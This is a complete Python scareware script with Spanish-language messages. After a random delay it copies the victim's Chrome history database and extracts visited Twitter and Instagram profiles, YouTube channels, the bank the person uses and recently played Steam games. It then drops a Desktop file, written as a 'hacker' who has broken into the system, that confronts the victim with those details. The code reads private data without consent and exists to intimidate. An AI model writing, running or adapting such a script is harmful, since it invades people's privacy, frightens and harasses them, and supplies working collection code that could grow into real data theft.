import glob
import os
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re

HACKER_FILE_NAME = "PARA TI.txt"

def delay_action():
    n_hours = randrange(1, 4)
    sleep(n_hours) #* 60 * 60)


def get_user_path():
    return "{}/".format(Path.home())


def creat_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w", encoding="utf-8")
    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(5)


def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall(r"https://twitter\.com/([A-Za-z0-9_]+)", item[2])
        if results and results[0] not in ["notifications", "home", "explore"]:
            profiles_visited.append(results[0])

    if profiles_visited:
        hacker_file.write("\nHe visto que has estado mirando estos perfiles en Twitter: {}...\n".format(", ".join(set(profiles_visited))))



def check_YouTube_channels_and_scare_user(hacker_file, chrome_history):
    channels_visited = []
    for item in chrome_history:
        results = re.findall(r"(.+?) - YouTube$", item[0])
        if results:
            channels_visited.append(results[0])

    if channels_visited:
        hacker_file.write("\nTambién has estado mirando estos canales de YouTube: {}...\n".format(", ".join(set(channels_visited[:4]))))



def check_instagram_users_and_scare_user(hacker_file, chrome_history):
    instagram_visited = []
    for item in chrome_history:
        results = re.findall(r"https://www\.instagram\.com/([A-Za-z0-9_.]+)", item[2])
        if results:
            instagram_visited.append(results[0])

    if instagram_visited:
        hacker_file.write("\nAdemás de buscar estos perfiles en instagram: {}...\n".format(", ".join(instagram_visited)))


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "CaixaBank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja", "Revolut"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    if his_bank:
        hacker_file.write("\n¿Guardas el dinero en este banco? {}. Muy interesante...\n".format(his_bank))


def check_steam_games(hacker_file):
    steam = False
    while not steam:
        try:
            path = "C:/Program Files (x86)/Steam/steamapps/common/"
            if os.path.exists(path):
                games = []
                steam_path = "C:/Program Files (x86)/Steam/steamapps/common/*"
                games_paths = glob.glob(steam_path)

                games_paths_filter = []

                for game in games_paths:
                    if os.path.isdir(game):  # Verifica que sea una carpeta
                        game_name = os.path.basename(game)  # Extrae solo el nombre de la carpeta
                        if "steam" not in game_name.lower():  # Verifica que no contenga "steam"
                            games_paths_filter.append(game)  # Si pasa el filtro, lo agrega a la lista

                games_paths = games_paths_filter
                games_paths.sort(key=os.path.getmtime, reverse=True)

                for game in games_paths:
                    games.append(game.split("\\")[-1])
                if games:
                    hacker_file.write(
                        "\n¿Y estos son los últimos juegos a los que has jugado? {}".format(", ".join(games[:4])))
                steam = True
            else:
                raise FileNotFoundError(f"La ruta {path} no se encuentra en el sistema.")

        except FileNotFoundError as e:
            print(f"Error: {e}")
            break


def main():
    #We will wait up to 1 or 3 hours
    delay_action()

    #Get the user path
    user_path = get_user_path()

    #Get chrome history
    chrome_history =  get_chrome_history(user_path)

    #Creat .txt
    hacker_file = creat_hacker_file(user_path)

    #Write  scary thing in file
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_YouTube_channels_and_scare_user(hacker_file, chrome_history)
    check_instagram_users_and_scare_user(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
